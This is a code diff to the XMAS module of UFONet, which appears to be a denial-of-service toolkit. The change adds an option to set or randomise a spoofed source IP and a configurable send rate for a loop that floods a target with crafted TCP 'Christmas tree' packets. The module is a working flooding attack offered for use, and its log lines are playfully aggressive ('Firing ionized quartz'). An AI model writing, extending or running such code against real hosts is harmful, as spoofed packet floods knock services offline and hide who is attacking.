@@ -10,6 +10,8 @@ with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket
+
+from core.mods.mod_config import XMAS_SPEED
 try:
     from urlparse import urlparse
 except:
@@ -29,7 +31,7 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def xmasize(ip, sport, rounds):
+def xmasize(ip, sport, rounds, source = None):
     n=0
     try:
         for x in range (0,int(rounds)):
@@ -39,6 +41,14 @@ def xmasize(ip, sport, rounds):
             window = randInt()
             IP_p = IP()
             IP_p.src = randIP()
+
+            if source is None:
+                print("[Info] [XMAS] Using random source IP")
+                IP_p.src = randIP()
+            else:
+                print("[Info] [XMAS] Using given source IP")
+                IP_p.src = source
+
             try:
                 IP_p.dst = ip
             except:
@@ -53,14 +63,14 @@ def xmasize(ip, sport, rounds):
             try:
                 send(IP_p/TCP_l, verbose=0)
                 print("[Info] [AI] [XMAS] Firing 'ionized quartz' ["+str(n)+"] -> [IONIZING!]")
-                time.sleep(1) # sleep time required for balanced sucess
+                time.sleep(1/XMAS_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [XMAS] Failed to engage with 'ionized quartz' ["+str(n)+"]")
     except:
         print("[Error] [AI] [XMAS] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class XMAS(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source = None):
         print("[Info] [AI] TCP 'Christmas Tree' (XMAS) is ready to fire: [" , rounds, "ionized quartzs ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -84,4 +94,4 @@ class XMAS(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [XMAS] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        xmasize(ip, sport, rounds) # attack with XMAS using threading
+        xmasize(ip, sport, rounds, source = None) # attack with XMAS using threading
